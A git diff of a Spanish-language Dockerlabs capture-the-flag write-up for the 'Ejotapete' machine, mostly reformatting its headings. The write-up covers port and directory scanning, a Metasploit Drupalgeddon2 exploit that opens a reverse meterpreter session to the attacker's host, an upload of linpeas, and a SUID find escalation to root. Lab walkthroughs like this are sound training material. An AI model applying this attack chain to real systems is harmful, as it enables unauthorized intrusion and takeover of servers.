@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Ejotapete 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Ejotapete ​​
+
+## 🖥️ Writeup - Ejotapete
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Drupal` `Drupalgeddon2` `Metasploit` `RCE` `Gobuster` `Linpeas` `SUID`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip ejotapete.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh ejotapete.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 21:21 CEST
 Nmap scan report for 172.17.0.2
@@ -78,13 +87,14 @@ Solo el puerto `80` está abierto, y al acceder nos encontramos con un `403 Forb
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
-# GOBUSTER
+## GOBUSTER
 
 ```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -109,7 +119,7 @@ Encontramos un directorio `/drupal`, lo que indica que podría tratarse de un CM
 
 Si navegamos dentro del directorio, confirmamos que efectivamente se trata de un `CMS Drupal`. Este tiene múltiples vulnerabilidades conocidas, así que utilizamos `Metasploit` para intentar explotar alguna de ellas.
 
-# METASPLOIT
+## METASPLOIT
 
 ```bash
 msfconsole
@@ -125,6 +135,7 @@ run
 ```
 
 Info:
+
 ```
 [*] Started reverse TCP handler on 10.0.4.12:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -139,7 +150,7 @@ Server username: www-data
 
 Obtenemos una sesión meterpreter con el usuario `www-data`.
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Para escalar privilegios, transferimos el script `linpeas.sh` desde nuestra máquina atacante al directorio `/tmp` de la víctima.
 
@@ -149,6 +160,7 @@ upload /home/trihack/Downloads/linpeas.sh
 ```
 
 Info:
+
 ```
 [*] Uploading  : /home/trihack/Downloads/linpeas.sh -> linpeas.sh
 [*] Uploaded -1.00 B of 932.07 KiB (0.0%): /home/trihack/Downloads/linpeas.sh -> linpeas.sh
@@ -166,9 +178,6 @@ chmod +x linpeas.sh
 
 Info:
 
-![alt text](../images/linpeas.png)
-
-
 En los binarios con permisos `SUID`, identificamos que podemos ejecutar el binario `find` con privilegios de `root`.
 
 Aprovechamos esto para obtener una `shell` de `root` de la siguiente manera:
@@ -178,9 +187,11 @@ Aprovechamos esto para obtener una `shell` de `root` de la siguiente manera:
 ```
 
 Info:
+
 ```
 bash-4.4# whoami
 root
 bash-4.4# 
 ```
+
 Ya somos root!
